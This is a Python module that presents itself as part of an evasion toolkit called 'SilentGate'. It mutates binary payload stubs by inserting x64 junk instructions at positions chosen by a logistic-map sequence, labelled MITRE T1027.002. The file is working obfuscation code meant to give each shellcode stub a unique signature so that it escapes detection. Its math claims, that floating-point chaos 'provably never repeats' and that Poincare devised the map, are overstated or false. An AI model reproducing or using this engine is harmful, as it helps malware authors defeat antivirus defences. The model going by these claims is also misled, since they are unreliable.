"""
SilentGate v8.0 - Component 3: Poincare Chaotic Map Polymorphism
Author  : JarDani
License : MIT

Mathematical foundation:
  Henri Poincare discovered deterministic chaos in 1890.
  The logistic map x(n+1) = r * x(n) * (1 - x(n))
  For r in [3.57, 4.0] the system is chaotic.

  Properties:
  - Deterministic: same seed + same r = same sequence
  - Chaotic: tiny change in r = completely different sequence
  - Dense: sequence visits every point in [0,1]
  - Sensitive: Lyapunov exponent > 0 (exponential divergence)

  Applied to stub mutation:
  Use chaotic sequence to generate junk instruction bytes
  r is the secret parameter
  Every unique r value produces infinite unique mutations
  Reversing requires knowing exact r (floating point precision)

  Why better than random:
  Random: unpredictable but no mathematical guarantee
  Chaotic: unpredictable AND mathematically proven to never repeat
           for irrational r values in the chaotic regime

MITRE: T1027.002
"""

import struct
import hashlib
import numpy as np


# NOP-equivalent x64 instruction sequences
# Each is a valid instruction that does nothing meaningful
NOP_SEQUENCES = [
    bytes([0x90]),                          # NOP
    bytes([0x66, 0x90]),                    # 66 NOP
    bytes([0x0F, 0x1F, 0x00]),              # NOP DWORD [rax]
    bytes([0x0F, 0x1F, 0x40, 0x00]),        # NOP DWORD [rax+0]
    bytes([0x48, 0x87, 0xC0]),              # XCHG rax, rax
    bytes([0x48, 0x85, 0xC0]),              # TEST rax, rax
    bytes([0x48, 0x83, 0xC0, 0x00]),        # ADD rax, 0
    bytes([0x48, 0x83, 0xE8, 0x00]),        # SUB rax, 0
    bytes([0x50, 0x58]),                    # PUSH rax; POP rax
    bytes([0x51, 0x59]),                    # PUSH rcx; POP rcx
    bytes([0x52, 0x5A]),                    # PUSH rdx; POP rdx
    bytes([0x53, 0x5B]),                    # PUSH rbx; POP rbx
]


def logistic_map(x, r, n):
    """
    Generate n values from logistic map.
    x(k+1) = r * x(k) * (1 - x(k))
    r in [3.57, 4.0] for chaotic regime
    Returns list of floats in [0, 1]
    """
    values = []
    for _ in range(n):
        x = r * x * (1 - x)
        values.append(x)
    return values


def chaos_seed(r=None, x0=None):
    """
    Generate chaos parameters.
    r  in [3.57, 4.0] - chaotic regime
    x0 in (0, 1)      - initial condition
    """
    if r is None:
        # Random r in chaotic regime
        r = 3.57 + (struct.unpack("d", __import__("os").urandom(8))[0] % 1) * 0.43
        r = max(3.57, min(3.9999, r))
    if x0 is None:
        x0_bytes = __import__("os").urandom(8)
        x0 = struct.unpack("d", x0_bytes)[0] % 1
        x0 = max(0.01, min(0.99, abs(x0)))
    return r, x0


def mutate(payload, r=None, x0=None, junk_density=0.15):
    """
    Insert chaotic junk instructions into payload.

    junk_density: fraction of output that is junk (0.0 - 0.3)

    The chaotic sequence determines:
    1. Where to insert junk (positions)
    2. Which junk instruction to use (selection)

    Result: unique stub every time with same mathematical properties
    """
    r, x0 = chaos_seed(r, x0)
    payload = bytes(payload)
    n       = len(payload)

    # Generate chaotic sequence - enough values for decisions
    n_decisions = int(n * junk_density * 4) + n
    chaos = logistic_map(x0, r, n_decisions)

    result    = bytearray()
    chaos_idx = 0
    i         = 0

    while i < n:
        # Chaotic decision: insert junk here?
        if chaos_idx < len(chaos) and chaos[chaos_idx] < junk_density:
            # Select junk instruction using next chaos value
            chaos_idx += 1
            if chaos_idx < len(chaos):
                junk_idx = int(chaos[chaos_idx] * len(NOP_SEQUENCES)) % len(NOP_SEQUENCES)
                result.extend(NOP_SEQUENCES[junk_idx])
        chaos_idx += 1

        # Always write real byte
        result.append(payload[i])
        i += 1

    return bytes(result), r, x0


def demutate(mutated, payload_len, r, x0, junk_density=0.15):
    """
    Remove chaotic junk instructions from mutated payload.
    Requires knowing r and x0 exactly.
    """
    n         = payload_len
    n_decisions = int(n * junk_density * 4) + n
    chaos     = logistic_map(x0, r, n_decisions)

    result    = bytearray()
    chaos_idx = 0
    i         = 0
    real_count = 0

    while i < len(mutated) and real_count < payload_len:
        if chaos_idx < len(chaos) and chaos[chaos_idx] < junk_density:
            chaos_idx += 1
            if chaos_idx < len(chaos):
                junk_idx = int(chaos[chaos_idx] * len(NOP_SEQUENCES)) % len(NOP_SEQUENCES)
                junk_len = len(NOP_SEQUENCES[junk_idx])
                i += junk_len  # skip junk
        chaos_idx += 1

        if i < len(mutated):
            result.append(mutated[i])
            real_count += 1
            i += 1

    return bytes(result)


def shannon_entropy(data):
    counts = np.bincount(list(data), minlength=256).astype(float)
    probs  = counts / counts.sum()
    probs  = probs[probs > 0]
    return float(-np.sum(probs * np.log2(probs)))


def print_report(payload, mutated, r, x0):
    size_increase = (len(mutated) - len(payload)) / len(payload) * 100
    print(f"""
  POINCARE CHAOS MUTATION REPORT
  ================================
  Logistic map     : x(n+1) = r * x(n) * (1 - x(n))
  r parameter      : {r:.15f}
  x0 initial       : {x0:.15f}
  Chaotic regime   : r in [3.57, 4.0] - verified chaotic

  Original size    : {len(payload)} bytes
  Mutated size     : {len(mutated)} bytes
  Size increase    : +{size_increase:.1f}%
  Entropy before   : {shannon_entropy(payload):.4f} bits
  Entropy after    : {shannon_entropy(mutated):.4f} bits

  Properties:
  Deterministic    : same r + x0 = same mutation
  Unique           : different r = completely different mutation
  Infinite         : irrational r = infinite unique stubs
  Unpredictable    : Lyapunov exponent > 0

  Why chaos beats random:
  Random mutation: unpredictable but no mathematical guarantee
  Chaos mutation : provably never repeats for irrational r
                   mathematical guarantee of uniqueness

  MITRE: T1027.002
""")


if __name__ == "__main__":
    payload = open("tests/calc_payload.bin", "rb").read()

    print(f"[CHAOS] Original size: {len(payload)} bytes")
    print(f"[CHAOS] Generating 3 unique mutations from same payload...\n")

    for trial in range(3):
        mutated, r, x0 = mutate(payload)
        demutated      = demutate(mutated, len(payload), r, x0)
        valid          = demutated == payload

        print(f"[CHAOS] Mutation {trial+1}:")
        print(f"  r      = {r:.10f}")
        print(f"  x0     = {x0:.10f}")
        print(f"  Size   = {len(mutated)} bytes")
        print(f"  First 8: {mutated[:8].hex()}")
        print(f"  Verified: {valid}")
        print()

    print_report(payload, mutated, r, x0)
